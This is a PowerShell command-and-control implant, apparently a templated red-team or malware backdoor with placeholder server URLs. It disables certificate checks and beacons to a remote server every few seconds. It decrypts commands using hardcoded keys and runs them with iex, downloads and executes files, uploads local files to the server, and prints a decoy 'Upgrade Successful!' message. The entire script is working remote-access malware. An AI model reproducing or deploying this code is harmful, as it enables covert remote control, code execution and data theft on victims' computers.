########################
#   GLOBAL VARIABLES
########################
$c2Addr = {{{cmd_url}}}
$retUrl = {{{handler_url}}}

$BEACONTIME = 5
#Server Sums
$c2Sum = "21-DD-E9-5D-9D-26-9C-BB-2F-A6-56-03-09-DC-A4-0C"
#Encryption Key
$key = "hacktheplanet"

#Setup SSL Behavior
$netAssembly = [Reflection.Assembly]::GetAssembly([System.Net.Configuration.SettingsSection])

if($netAssembly)
{
   $bindingFlags = [Reflection.BindingFlags] "Static,GetProperty,NonPublic"
   $settingsType = $netAssembly.GetType("System.Net.Configuration.SettingsSectionInternal")

   $instance = $settingsType.InvokeMember("Section", $bindingFlags, $null, $null, @())

   if($instance)
   {
      $bindingFlags = "NonPublic","Instance"
          #$useUnsafeHeaderParsingField = $settingType.GetField("useUnsafeHeaderParsing", $bindingFlags)

          if($useUnsafeHeaderParsingField)
          {
             $useUnsafeHeaderParsingField.SetVAlue($instance, $true)
          }
        }
}

########################
#   FUNCTIONS
########################

function webRequest($target, $cookie) {
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$client = new-object System.Net.WebClient
$client.Headers.Add([System.Net.HttpRequestHeader]::Cookie, $cookie);
$client.DownloadString($target)
}

function webPost($target, $cookie, $retval) {
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = new-object system.net.WebClient
$response = new-object System.Collections.Specialized.NameValueCollection
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, $cookie);
$response.Add("return", $retval)
$webpage = $wc.UploadValues($target, $response)
}

function webDownload($url, $file){
$wc = new-object system.net.WebClient
$wc.DownloadFile($url, $file)   
}

function md5sum($data) {
   $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
   $utf8 = new-object -TypeName System.Text.UTF8Encoding
   $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($data)))
   return $hash
}

## Start-Encryption
##################################################################################################

[Reflection.Assembly]::LoadWithPartialName("System.Security")

function Encrypt-String($String, $Passphrase, $salt="CorrectHorseBatteryStaple", $init="Yet another key", [switch]$arrayOutput)
{
   $r = new-Object System.Security.Cryptography.RijndaelManaged
   $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
   $salt = [Text.Encoding]::UTF8.GetBytes($salt)
   $word = $pass + $salt

   #$r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
   #$r.Key = [System.Text.Encoding]::UTF8.GetBytes([System.BitConverter]::ToString($hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($word))).replace('-', ''))[0..31]
   #$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
   #$r.IV = [System.Text.Encoding]::UTF8.GetBytes([System.BitConverter]::ToString($hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($init))).replace('-', ''))[0..15]

   $r.IV = [System.Text.Encoding]::UTF8.GetBytes("This is a key123")
   $r.Key = [System.Text.Encoding]::UTF8.GetBytes("This is an IV456")

   $r.Key
   $r.IV


   $r = new-Object System.Security.Cryptography.RijndaelManaged
   #$r.Key = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes("test"))[0..15]
   #$r.Key
   #$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes("test"))[0..15]

   $r.Key = [Text.Encoding]::UTF8.GetBytes("A94A8FE5CCB19BA6")
   $r.IV = [Text.Encoding]::UTF8.GetBytes("A94A8FE5CCB19BA6")


   #$String = "The answer is no"

   $r.Padding = "None"
   $r.BlockSize = 0x80

   $c = $r.CreateEncryptor()
   $ms = new-Object IO.MemoryStream
   $cs = new-Object Security.Cryptography.CryptoStream $ms,$c,"Write"
   $sw = new-Object IO.StreamWriter $cs
   $sw.Write($String)
   $sw.Close()
   $cs.Close()
   $ms.Close()
   $r.Clear()
   [byte[]]$result = $ms.ToArray()
   if($arrayOutput) {
      return $result
   } else {
      return [Convert]::ToBase64String($result)
   }
}

## Start-Decryption
##################################################################################################


[Reflection.Assembly]::LoadWithPartialName("System.Security")

function Decrypt-String($Encrypted, $Passphrase, $salt="CorrectHorseBatteryStaple", $init="Yet another key")
{
   #$Encrypted = "DvJDKmJc7LapAhcwHHRreg=="
   if($Encrypted -is [string]){
      $Encrypted = [Convert]::FromBase64String($Encrypted)
   }

   $r = new-Object System.Security.Cryptography.RijndaelManaged
   #$pass = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)
   #$salt = [System.Text.Encoding]::UTF8.GetBytes($salt)

   #$r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
   #$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]

   #$r.Key = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes("test") )[0..15]
   #$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes("test") )[0..15]

   $r.Key = [Text.Encoding]::UTF8.GetBytes("A94A8FE5CCB19BA6")
   $r.IV = [Text.Encoding]::UTF8.GetBytes("A94A8FE5CCB19BA6")

   $r.Padding = "None"
   $r.BlockSize = 0x80


   $d = $r.CreateDecryptor()
   $ms = new-Object IO.MemoryStream @(,$Encrypted)
   $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read"
   $sr = new-Object IO.StreamReader $cs
   Write-Output $sr.ReadToEnd()
   $sr.Close()
   $cs.Close()
   $ms.Close()
   $r.Clear()
}

########################
#   MAIN EXECUTION
########################
echo "Upgrade Successful!"
$count = 0

while ($true)
{
   $count++
   $id = hostname
   $authstring = "ravenclaw"
   $cookie = "phpsessid=" + $id + "; uid=" + $authstring
   $serverMsg = webRequest $c2addr $cookie
   $c2SumCheck = md5sum($serverMsg)

   if ($c2SumCheck -ne $c2Sum)
   {
      #New command found
          #Decrypt Payload
          $cmd = Decrypt-String $serverMsg $key
          $retVal = $cmd
          if ($cmd.split(" ")[0] -eq "dlx")
          {
             $file = $cmd.substring(4)
             webDownload $retUrl.substring(0, $retUrl.length-10) $file

             $retVal += iex $file | Out-String
             $retVal = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($retVal))
             webPost $retUrl $cookie $retVal
          }
          elseif ($cmd.split(" ")[0] -eq "download")
          {
             $file = $cmd.substring(9)
             webDownload $retUrl.substring(0, $retUrl.length-10) $file
          }
          elseif ($cmd.split(" ")[0] -eq "upload")
          {
             $file = $cmd.substring(7)
             $flieContent = get-content $file
             $fileb64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($flieContent))
             $upUrl = $retUrl.substring(0, $retUrl.length-10) + "upload.php"
             webPost $upUrl $cookie $fileb64
          }
          else
          {
             $retVal += iex $cmd | Out-String
             $retVal = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($retVal))
             webPost $retUrl $cookie $retVal
          }
          $c2Sum = $c2SumCheck
   }
   else
   {
   echo "Check In: " $count
   }

   Start-Sleep -s $BEACONTIME
}
